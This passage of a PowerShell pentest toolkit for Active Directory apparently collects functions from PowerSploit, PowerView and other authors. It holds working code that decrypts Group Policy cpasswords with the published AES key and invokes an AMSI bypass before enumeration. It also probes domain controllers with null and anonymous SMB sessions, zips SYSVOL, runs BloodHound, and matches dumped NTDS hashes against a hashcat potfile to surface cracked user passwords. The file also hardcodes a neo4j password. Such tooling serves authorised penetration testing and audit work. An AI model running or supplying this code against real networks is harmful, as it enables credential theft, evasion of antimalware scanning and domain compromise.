    Author: Chris Campbell (@obscuresec)  
    License: BSD 3-Clause  
    Required Dependencies: None  
    Optional Dependencies: None  
    
    .DESCRIPTION
    
    Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
    
    .PARAMETER Server
    
    Specify the domain controller to search for.
    Default's to the users current domain
    
    .PARAMETER SearchForest
    
    Map all reaschable trusts and search all reachable SYSVOLs.
    
    .EXAMPLE
    
    Get-GPPPassword
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:28:53}
    Passwords : {password12}
    UserNames : {test1}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml
    
    NewName   : {mspresenters}
    Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
    Passwords : {Recycling*3ftw!, password123, password1234}
    UserNames : {Administrator (built-in), DummyAccount, dummy2}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
    Passwords : {password, password1234$}
    UserNames : {administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
    Passwords : {password, read123}
    UserNames : {DEMO\Administrator, admin}
    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml
    
    .EXAMPLE
    
    Get-GPPPassword -Server EXAMPLE.COM
    
    NewName   : [BLANK]
    Changed   : {2014-02-21 05:28:53}
    Passwords : {password12}
    UserNames : {test1}
    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB982DA}\MACHINE\Preferences\DataSources\DataSources.xml
    
    NewName   : {mspresenters}
    Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
    Passwords : {Recycling*3ftw!, password123, password1234}
    UserNames : {Administrator (built-in), DummyAccount, dummy2}
    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB9AB12}\MACHINE\Preferences\Groups\Groups.xml
    
    .EXAMPLE
    
    Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
    
    password
    password12
    password123
    password1234
    password1234$
    read123
    Recycling*3ftw!
    
    .LINK
    
    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
    #>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SearchForest
    )

    # define helper function that decodes and decrypts password
    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword
        )

        try {
            #Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)

            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
            # Make sure System.Core is loaded
            [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null

            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            #Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }

        catch { Write-Error $Error[0] }
    }

    # helper function to parse fields from xml files
    function Get-GPPInnerField {
    [CmdletBinding()]
        Param (
            $File
        )

        try {
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            # check for the cpassword field
            if ($Xml.innerxml -match 'cpassword') {

                $Xml.GetElementsByTagName('Properties') | ForEach-Object {
                    if ($_.cpassword) {
                        $Cpassword = $_.cpassword
                        if ($Cpassword -and ($Cpassword -ne '')) {
                           $DecryptedPassword = Get-DecryptedCpassword $Cpassword
                           $Password = $DecryptedPassword
                           Write-Verbose "[Get-GPPInnerField] Decrypted password in '$File'"
                        }

                        if ($_.newName) {
                            $NewName = $_.newName
                        }

                        if ($_.userName) {
                            $UserName = $_.userName
                        }
                        elseif ($_.accountName) {
                            $UserName = $_.accountName
                        }
                        elseif ($_.runAs) {
                            $UserName = $_.runAs
                        }

                        try {
                            $Changed = $_.ParentNode.changed
                        }
                        catch {
                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.changed for '$File'"
                        }

                        try {
                            $NodeName = $_.ParentNode.ParentNode.LocalName
                        }
                        catch {
                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.ParentNode.LocalName for '$File'"
                        }

                        if (!($Password)) {$Password = '[BLANK]'}
                        if (!($UserName)) {$UserName = '[BLANK]'}
                        if (!($Changed)) {$Changed = '[BLANK]'}
                        if (!($NewName)) {$NewName = '[BLANK]'}

                        $GPPPassword = New-Object PSObject
                        $GPPPassword | Add-Member Noteproperty 'UserName' $UserName
                        $GPPPassword | Add-Member Noteproperty 'NewName' $NewName
                        $GPPPassword | Add-Member Noteproperty 'Password' $Password
                        $GPPPassword | Add-Member Noteproperty 'Changed' $Changed
                        $GPPPassword | Add-Member Noteproperty 'File' $File
                        $GPPPassword | Add-Member Noteproperty 'NodeName' $NodeName
                        $GPPPassword | Add-Member Noteproperty 'Cpassword' $Cpassword
                        $GPPPassword
                    }
                }
            }
        }
        catch {
            Write-Warning "[Get-GPPInnerField] Error parsing file '$File' : $_"
        }
    }

    # helper function (adapted from PowerView) to enumerate the domain/forest trusts for a specified domain
    function Get-DomainTrust {
        [CmdletBinding()]
        Param (
            $Domain
        )

        if (Test-Connection -Count 1 -Quiet -ComputerName $Domain) {
            try {
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
                $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                if ($DomainObject) {
                    $DomainObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrust] Error contacting domain '$Domain' : $_"
            }

            try {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Domain)
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                if ($ForestObject) {
                    $ForestObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrust] Error contacting forest '$Domain' (domain may not be a forest object) : $_"
            }
        }
    }

    # helper function (adapted from PowerView) to enumerate all reachable trusts from the current domain
    function Get-DomainTrustMapping {
        [CmdletBinding()]
        Param ()

        # keep track of domains seen so we don't hit infinite recursion
        $SeenDomains = @{}

        # our domain stack tracker
        $Domains = New-Object System.Collections.Stack

        try {
            $CurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
            $CurrentDomain
        }
        catch {
            Write-Warning "[Get-DomainTrustMapping] Error enumerating current domain: $_"
        }

        if ($CurrentDomain -and $CurrentDomain -ne '') {
            $Domains.Push($CurrentDomain)

            while($Domains.Count -ne 0) {

                $Domain = $Domains.Pop()

                # if we haven't seen this domain before
                if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

                    Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"

                    # mark it as seen in our list
                    $Null = $SeenDomains.Add($Domain, '')

                    try {
                        # get all the domain/forest trusts for this domain
                        Get-DomainTrust -Domain $Domain | Sort-Object -Unique | ForEach-Object {
                            # only output if we haven't already seen this domain and if it's pingable
                            if (-not $SeenDomains.ContainsKey($_) -and (Test-Connection -Count 1 -Quiet -ComputerName $_)) {
                                $Null = $Domains.Push($_)
                                $_
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-DomainTrustMapping] Error: $_"
                    }
                }
            }
        }
    }

    try {
        $XMLFiles = @()
        $Domains = @()

        $AllUsers = $Env:ALLUSERSPROFILE
        if (-not $AllUsers) {
            $AllUsers = 'C:\ProgramData'
        }

        # discover any locally cached GPP .xml files
        Write-Verbose '[Get-GPPPassword] Searching local host for any cached GPP files'
        $XMLFiles += Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue

        if ($SearchForest) {
            Write-Verbose '[Get-GPPPassword] Searching for all reachable trusts'
            $Domains += Get-DomainTrustMapping
        }
        else {
            if ($Server) {
                $Domains += , $Server
            }
            else {
                # in case we're in a SYSTEM context
                $Domains += , [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
            }
        }

        $Domains = $Domains | Where-Object {$_} | Sort-Object -Unique

        ForEach ($Domain in $Domains) {
            # discover potential domain GPP files containing passwords, not complaining in case of denied access to a directory
            Write-Verbose "[Get-GPPPassword] Searching \\$Domain\SYSVOL\*\Policies. This could take a while."
            $DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')

            if($DomainXMLFiles) {
                $XMLFiles += $DomainXMLFiles
            }
        }

        if ( -not $XMLFiles ) { throw '[Get-GPPPassword] No preference files found.' }

        Write-Verbose "[Get-GPPPassword] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

        ForEach ($File in $XMLFiles) {
            $Result = (Get-GppInnerField $File.Fullname)
            $Result
        }
    }
    catch { Write-Error $Error[0] }
}
function Get-DomainExchangeVersion {
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    Check Exchange with adsi, thx lkys37en https://github.com/lkys37en/Pentest-Scripts/tree/master/Powershell
    #>
    param (
        [string]$Domain,
        [string]$DistinguishedName
    )
    begin{
        if(!$Domain){
            try{
                $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }catch{
                Write-Output "[-] $($_.Exception.Message)"
                Write-Output "Use runas.exe with -domain"
                return
            }
        }
        if(!$DistinguishedName){
            $DistinguishedName = "DC=$($Domain.replace(".", ",DC="))"
        }
        $CN = $Domain.Split('.')[0]
        $ExchangeVersions = @{
            "15.02.0397.003" = "Exchange Server 2019 CU2, Not Vulnerable" 
            "15.02.0330.005" = "Exchange Server 2019 CU1, Not Vulnerable"
            "15.02.0221.012" = "Exchange Server 2019 RTM, Vulnerable to PrivExchange!" 
            "15.02.0196.000" = "Exchange Server 2019 Preview, Vulnerable to PrivExchange!" 
            "15.01.1779.002" = "Exchange Server 2016 CU13, Not Vulnerable"
            "15.01.1713.005" = "Exchange Server 2016 CU12, Vulnerable to PrivExchange!" 
            "15.01.1591.010" = "Exchange Server 2016 CU11, Vulnerable to PrivExchange!" 
            "15.01.1531.003" = "Exchange Server 2016 CU10, Vulnerable to PrivExchange!" 
            "15.01.1466.003" = "Exchange Server 2016 CU9, Vulnerable to PrivExchange!"  
            "15.01.1415.002" = "Exchange Server 2016 CU8, Vulnerable to PrivExchange!"  
            "15.01.1261.035" = "Exchange Server 2016 CU7, Vulnerable to PrivExchange!"  
            "15.01.1034.026" = "Exchange Server 2016 CU6, Vulnerable to PrivExchange!"  
            "15.01.0845.034" = "Exchange Server 2016 CU5, Vulnerable to PrivExchange!"  
            "15.01.0669.032" = "Exchange Server 2016 CU4, Vulnerable to PrivExchange!"  
            "15.01.0544.027" = "Exchange Server 2016 CU3, Vulnerable to PrivExchange!"  
            "15.01.0466.034" = "Exchange Server 2016 CU2, Vulnerable to PrivExchange!"  
            "15.01.0396.030" = "Exchange Server 2016 CU1, Vulnerable to PrivExchange!"  
            "15.01.0225.042" = "Exchange Server 2016 RTM, Vulnerable to PrivExchange!"  
            "15.01.0225.016" = "Exchange Server 2016 Preview, Vulnerable to PrivExchange!" 
            "15.00.1497.002" = "Exchange Server 2013 CU23, Not Vulnerable"
            "15.00.1473.003" = "Exchange Server 2013 CU22, Not Vulnerable!"
            "15.00.1395.004" = "Exchange Server 2013 CU21, Vulnerable to PrivExchange!"
            "15.00.1367.003" = "Exchange Server 2013 CU20, Vulnerable to PrivExchange!"
            "15.00.1365.001" = "Exchange Server 2013 CU19, Vulnerable to PrivExchange!"
            "15.00.1347.002" = "Exchange Server 2013 CU18, Vulnerable to PrivExchange!"
            "15.00.1320.004" = "Exchange Server 2013 CU17, Vulnerable to PrivExchange!"
            "15.00.1293.002" = "Exchange Server 2013 CU16, Vulnerable to PrivExchange!"
            "15.00.1263.005" = "Exchange Server 2013 CU15, Vulnerable to PrivExchange!"
            "15.00.1236.003" = "Exchange Server 2013 CU14, Vulnerable to PrivExchange!"
            "15.00.1210.003" = "Exchange Server 2013 CU13, Vulnerable to PrivExchange!"
            "15.00.1178.004" = "Exchange Server 2013 CU12, Vulnerable to PrivExchange!"
            "15.00.1156.006" = "Exchange Server 2013 CU11, Vulnerable to PrivExchange!"
            "15.00.1130.007" = "Exchange Server 2013 CU10, Vulnerable to PrivExchange!"
            "15.00.1104.005" = "Exchange Server 2013 CU9, Vulnerable to PrivExchange!"
            "15.00.1076.009" = "Exchange Server 2013 CU8, Vulnerable to PrivExchange!"
            "15.00.1044.025" = "Exchange Server 2013 CU7, Vulnerable to PrivExchange!"
            "15.00.0995.029" = "Exchange Server 2013 CU6, Vulnerable to PrivExchange!"
            "15.00.0913.022" = "Exchange Server 2013 CU5, Vulnerable to PrivExchange!"
            "15.00.0847.032" = "Exchange Server 2013 SP1, Vulnerable to PrivExchange!"
            "15.00.0775.038" = "Exchange Server 2013 CU3, Vulnerable to PrivExchange!"
            "15.00.0712.024" = "Exchange Server 2013 CU2, Vulnerable to PrivExchange!"
            "15.00.0620.029" = "Exchange Server 2013 CU1, Vulnerable to PrivExchange!"
            "15.00.0516.032" = "Exchange Server 2013 RTM, Vulnerable to PrivExchange!"
        }
        $h=@{}
    }
    process{
        try{
            $ExchangeVersion = ([ADSI]"LDAP://cn=$CN,cn=Microsoft Exchange,cn=Services,cn=Configuration,$DistinguishedName").msExchProductID
        }catch{
            Write-Output "Failed connecting to ldap"
            Write-Output "[-] $($_.Exception.Message)"
        }
        if($ExchangeVersion){
            Write-Output "Exchange version $ExchangeVersion, $($ExchangeVersions[$ExchangeVersion])"
        }
        try{
            $ExchangeStats=([ADSI]"LDAP://cn=$CN,cn=Microsoft Exchange,cn=Services,cn=Configuration,$DistinguishedName").msExchOrganizationSummary
        }catch{
            Write-Output "Failed connecting to ldap"
            Write-Output "[-] $($_.Exception.Message)"
        }
        if($ExchangeStats){
            $ExchangeStats | foreach {try{$h.Add($_.split(',')[0],$_.split(',')[1])}catch{}}
            New-Object PSObject -Property $h
        }
    }
}
Function Invoke-PingCastle{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    thx lkys37en https://github.com/lkys37en/Start-ADEnum/blob/master/Functions/Start-ADEnum.ps1#L427
    
    .DESCRIPTION
    Run PingCastle!
    #>
    param (
        [string]$Domain,

        [Parameter(Mandatory=$true)]
        [string]$output,

        [Parameter(Mandatory=$true)]
        [ValidateScript({Test-Path -Path $_ })]
        [string]$Pingcastle
    )
    begin{
        if(!(test-path $output)){
            Write-Output "[*]Creating output folder.."
            New-Item -ItemType Directory -Path $output | Out-Null
        }
        #Set variables
        if(!$Domain){
            try{
                $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
                $Domain = $current_domain.Name
            }catch{
                Write-Output "Use runas.exe with -Domain flag"
                throw
            }
        }
    }
    process{
        @(
            "--server $Domain --healthcheck --no-enum-limit"
            "--scanner laps_bitlocker --server $Domain"
            "--scanner nullsession --server $Domain"
            "--scanner nullsession-trust --server $Domain"
            "--scanner aclcheck --server $Domain"
            "--scanner share --server $Domain"
            "--scanner smb --server $Domain"
            "--scanner spooler --server $Domain"
            "--scanner startup --server $Domain"
            "--scanner antivirus --server $Domain "
        ) | foreach {
                "PingCastle.exe $_"
                Start-Process $Pingcastle -ArgumentList $_ -WorkingDirectory $output -WindowStyle Normal
        }
    }
}
function New-SYSVOLZip {
    <#
    .SYNOPSIS
    Compresses all folders/files in SYSVOL to a .zip file.
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: None
    .PARAMETER Domain
    The domain to clone GPOs from. Defaults to $ENV:USERDNSDOMAIN.
    .PARAMETER Path
    The output file for the zip archive, defaults to "$Domain.sysvol.zip".
    #>
    
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain = $ENV:USERDNSDOMAIN,

        [Parameter(Position = 1)]
        [Alias('Out', 'OutFile')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path
    )

    if ($PSBoundParameters['Path']) {
        $ZipPath = $PSBoundParameters['Path']
    }
    else {
        $ZipPath = "$($Domain).sysvol.zip"
    }

    if (-not (Test-Path -Path $ZipPath)) {
        Set-Content -Path $ZipPath -Value ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
    }
    else {
        throw "Output zip path '$ZipPath' already exists"
    }

    $ZipFileName = (Resolve-Path -Path $ZipPath).Path
    Write-Verbose "Outputting to .zip file: $ZipFileName"

    $SysVolPath = "\\$($Domain)\SYSVOL\"
    Write-Verbose "Using SysVolPath: $SysVolPath"
    $SysVolFolder = Get-Item "\\$($Domain)\SYSVOL\"

    # create the zip file
    $ZipFile = (New-Object -Com Shell.Application).NameSpace($ZipFileName)

    # 1024 -> do not display errors
    $ZipFile.CopyHere($SysVolFolder.FullName, 1024)
    Write-Verbose "$SysVolPath zipped to $ZipFileName"
    return $ZipFileName
}
function Invoke-Grouper2{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause
    
    .DESCRIPTION
    Run Grouper2!
    #>
    param (
        [Parameter(Mandatory=$true)]
        [ValidateScript({Test-Path -Path $_ })]
        [string]$SysvolPath, 

        [Parameter(Mandatory=$true)]
        [ValidateScript({Test-Path -Path $_ })]
        [string]$Grouper2
    )
    $SysvolPath = (gci $SysvolPath).FullName
    if((Get-ChildItem $SysvolPath).Attributes -match 'Archive'){
        [Reflection.Assembly]::LoadWithPartialName( "System.IO.Compression.FileSystem" )
        $destfile = $SysvolPath.TrimEnd('.zip')
        [System.IO.Compression.ZipFile]::ExtractToDirectory($SysvolPath,$destfile)
        $SysvolPath = $destfile
    }
    $folder = (Get-ChildItem $SysvolPath -Directory) | where {$_.name -match 'policies'}
    if(!$folder){
        $folder = (ls $SysvolPath).fullname
    }
    $folder | foreach {& $Grouper2 -o -s $_ -g -f Grouper2.html}
}
function Invoke-DomainEnum{
    <#
    .SYNOPSIS
    Author: Cube0x0
    License: BSD 3-Clause

    Invoke-Domain -DomainController 192.168.3.10 -Domain hackme.local
    #>
    param (
        [string]$DomainController,
        [string]$Domain,
        [string]$DistinguishedName
    )
    begin{
        #Set variables
        if(!$DomainController -or !$Domain){
            try{
                $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }catch{
                Write-Output "[-] $($_.Exception.Message)"
                Write-Output "Use runas.exe with -domain and -domaincontroller"
                return
            }
        }
        if(!$Domain){
            $Domain = $current_domain.Name
        }

        if(!$DomainController){
            $DomainController = $current_domain.PdcRoleOwner.Name
        }

        if(!$DistinguishedName){
            $DistinguishedName = "DC=$($Domain.replace(".", ",DC="))"
        }else{
            $DistinguishedName = $DistinguishedName
        }

        #Checks dependensies
        @(
            'ASBBypass.ps1'
            'PowerView.ps1'
            'SharpHound.ps1'
            'PingCastle.exe'
            'Grouper2.exe'
        ) | foreach {
            if(-not(Test-Path $PSScriptRoot\$_)){
                Write-Output "Missing dependencies.. $($_)"
                $missing=$true
            }
        }
        if($missing){
            return
        }
        . $PSScriptRoot\ASBBypass.ps1
        . $PSScriptRoot\PowerView.ps1
        . $PSScriptRoot\SharpHound.ps1
        Invoke-Bypass | Out-Null
    }
    process{
        #Check Trust https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
        Write-Output "`n[*] Domain Trust"
        try{
            Get-DomainTrust -Domain $Domain -DomainController $DomainController -ErrorAction stop
        }catch{
            Write-Output "[-] Domain trust Failed"
        }
        #https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
        #https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
        Write-Output "`n[*] CPasswords in Sysvol"
        try{
            Get-GroupPolicyPassword -Server $DomainController -ErrorAction stop
        }catch{
            Write-Output "[-] CPasswords in Sysvol Failed" 
        }

        #Active Directory Integrated DNS Wilcard Record https://blog.netspi.com/exploiting-adidns/
        Write-Output "`n[*] Active Directory Integrated DNS Wilcard Record"
        try{
            $zones=(Get-DomainDNSZone -Domain $Domain -DomainController $DomainController).ZoneName | where {$_ -notlike 'RootDNSServers'}
        }catch{
            Write-Output "[-] Testing for Active Directory Integrated DNS Wilcard Record Failed" 
        }
        foreach($zone in $zones){
            $records=(Get-DomainDNSRecord -ZoneName $zone -Domain $Domain -DomainController $DomainController).name
            $wildcard = $false
            foreach($record in $records){
                if($record -contains '*'){
                    Write-Output "[+] Wildcard record exists for zone $zone" 
                    $wildcard = $true
                    break
                }
            }
            if(-not $wildcard){
            Write-Output "[-] Wildcard record does not exists for zone $zone" 
            }
        }

        #Machine Account Quota https://blog.netspi.com/machineaccountquota-is-useful-sometimes/
        Write-Output "`n[*] ms-DS-MachineAccountQuota"
        Try{
            $adsi=Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ErrorAction stop
        }
        Catch{
            Write-Output "[-] Testing for ms-DS-MachineAccountQuota failed." 
        }
        $maq=($adsi.FindOne()).properties.'ms-ds-machineaccountquota'
        Write-Host "MachineAccountQuota: $maq"

        #Accounts with high badpwdcount
        #Write-Output "`n[*] Accounts with high badpwdcount"
        #try{
        #    Get-DomainUser -Properties badpwdcount,samaccountname | where -Property badpwdcount -ge 3
        #}catch{
        #   Write-Output "[-] Testing for accounts with high badpwdcount failed." 
        #}

        #Domain Password Policy
        Write-Output "`n[*] Domain Password Policy"
        (Get-DomainPolicy -Domain $Domain -DomainController $DomainController -ErrorAction stop).SystemAccess
        (Get-DomainPolicy -Domain $Domain -DomainController $DomainController -ErrorAction stop).RegistryValues
        (Get-DomainPolicy -Domain $Domain -DomainController $DomainController -ErrorAction stop).KerberosPolicy


        Write-Output "`n[*] Exchange version"
        Get-DomainExchangeVersion -Domain $Domain -DistinguishedName $DistinguishedName

        Write-Output "`n[*] CA certificate"
        Get-DomainCertificates -Domain $Domain -DistinguishedName $DistinguishedName

        #nullsession on DC's
        Write-Output "`n[*] NullSession Login on Domain Controllers"
        (Get-DomainController -Domain $Domain).displayname | foreach {
            try{
                New-SmbMapping -RemotePath \\$_\ipc$ -UserName '' -Password '' -ErrorAction stop
                New-Object  PSObject -Property @{
                    "ComputerName" = $_
                    "Status"       = $true
                }
            }
            catch{}
        }

        #anonymous on DC's
        Write-Output "`n[*] Anonymous Login on Domain Controllers"
        (Get-DomainController -Domain $Domain).displayname | foreach {
            try{
                New-SmbMapping -RemotePath \\$_\ipc$ -UserName 'anonymous' -Password '' -ErrorAction stop
                New-Object  PSObject -Property @{
                    "ComputerName" = $_
                    "Status"       = $true
                }
            }
            catch{}
        }

        #Zipping Sysvol and running grouper2
        Write-Output "`n[*] Running GPOAudit.."
        try{
            $zip = New-SYSVOLZip -Domain $domain
            Invoke-Grouper2 -SysvolPath $zip -Grouper2 '.\Grouper2.exe'
        }catch{
            Write-Output "[-] Failed running GPO Audit"
        }

        #bloodhound https://github.com/BloodHoundAD/BloodHound/
        Write-Output "`n[*] Running BloodHound.."
        invoke-bloodhound -collectionmethod all,LoggedOn -domain $Domain -SkipPing

        #PingCastle https://www.pingcastle.com/download/
        Write-Output "`n[*] Running PingCastle.."
        Invoke-PingCastle -Domain $domain -output (Get-Location) -Pingcastle '.\PingCastle.exe'
    }
}
function Get-WeakPasswords{
    <#
    .DESCRIPTION
    Find weak passwords from secretsdump NTDS output & hashcat potfile and imports it to bloodhound

    MATCH (n:User {enabled:True}),(m:Group {name:"DOMAIN ADMINS@FORG.SE"}),p=shortestPath((n)-[*1..]->(m)) where EXISTS(n.userpassword) RETURN p
    MATCH (n:User {enabled:True}),(m:Group {name:"DOMAIN ADMINS@FORG.SE"}),p=allshortestpaths((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) where EXISTS(n.userpassword) RETURN p
    #>
    param(
        [CmdletBinding()]
        [Parameter(Mandatory=$True)]           
        [string]$NTDSdump,

        [Parameter(Mandatory=$True)]           
        [string]$POTFile,
        
        [string]$Regex = "winter|fall|spring|summer|vinter|höst|vår|sommar|berlin|london|boston|password|stockholm|stockholm",

        [swithch]$Bloodhound,

        [string]$neo4jUser = 'neo4j',

        [string]$neo4jpassword = (ConvertTo-SecureString -String "neo4jj" -AsPlainText -Force),

        [string]$neo4jurl = 'http://127.0.0.1:7474'
    )
    try{
        Import-Module PSNeo4j -ErrorAction stop
    }catch{
        Write-Output "[-] Install-module PSNeo4j -force"
        throw
    }
    $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $neo4jUser, $neo4jpassword
    Set-PSNeo4jConfiguration -Credential $Cred -BaseUri  $neo4jurl
    $count = 0
    Get-Content .\out.txt.ntds |foreach {
        $vals = $_.split(':')
        if($vals){
            $usernameFull = $vals[0]
            $lm_hash = $vals[2]
            $nt_hash = $vals[3]
            $username = $usernameFull.split('\\')[-1]
            if(-not $usernameFull.EndsWith('$')){
                Write-Verbose "$username $lm_hash $nt_hash"
                Get-Content .\hashcat.potfile | foreach {
                    $nt,$pw = $_.split(':')
                    if($nt -like $nt_hash){
                        if($pw -match $regex){
                            Write-Output "$username : $pw"
                            if($Bloodhound){
                                $query = @"
MATCH (n:User)
WHERE n.name =~ '${username}.*'
SET n.userpassword = '${pw}'
RETURN n.name,n.userpassword
"@
                                Invoke-Neo4jQuery -Query $query |  Format-List -Property Neo4jData -Force
                            }
                            return
                        }
                        return
                    }
                }
            }
        }
    }
    Write-Output "Found $count weak passwords"
}
function ConvertFrom-CisHtml{
    <#
    .EXAMPLE
    PS > gci *html | foreach {ConvertFrom-CisHtml -html $_.fullname -output "C:\$($_.name)"}
    Found 0 improvements
    saved to C:\LAPTOP-CIS_Microsoft_Office_2016_Benchmark-XCCDF-.html
    Found 6 improvements
    saved to C:\LAPTOP-CIS_Microsoft_Office_Access_2016_Benchmark-XCCDF-.html
    Found 26 improvements
    saved to C:\LAPTOP-CIS_Microsoft_Office_Excel_2016_Benchmark-XCCDF-.html
    Found 39 improvements
    saved to C:\LAPTOP-CIS_Microsoft_Office_Outlook_2016_Benchmark-XCCDF-.html
    Found 12 improvements
    saved to C:\LAPTOP-CIS_Microsoft_Office_PowerPoint_2016_Benchmark-XCCDF-.html
    Found 19 improvements
    saved to C:\LAPTOP-CIS_Microsoft_Office_Word_2016_Benchmark-XCCDF-.html
    Found 195 improvements
    saved to C:\LAPTOP-CIS_Microsoft_Windows_10_Enterprise_Release_1803_Benchmark-XCCDF-.html
    Found 196 improvements
    saved to C:\LAPTOP-CIS_Microsoft_Windows_10_Enterprise_Release_1809_Benchmark-XCCDF.html
    #>
    param(
        [CmdletBinding()]
        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateScript({Test-Path -Path $_ })]
        $html,

        [Parameter(Mandatory=$true, Position=1)]
        $output
    )
    if(get-module PSWriteWord -ListAvailable){
        import-module PSWriteWord
    }else{
        Write-Output "install-module PSWriteWord"
        throw
    }
    $html_ = Get-Content $html -Raw
    $rep = New-Object -com "HTMLFILE"
    $rep.IHTMLDocument2_write($html_)
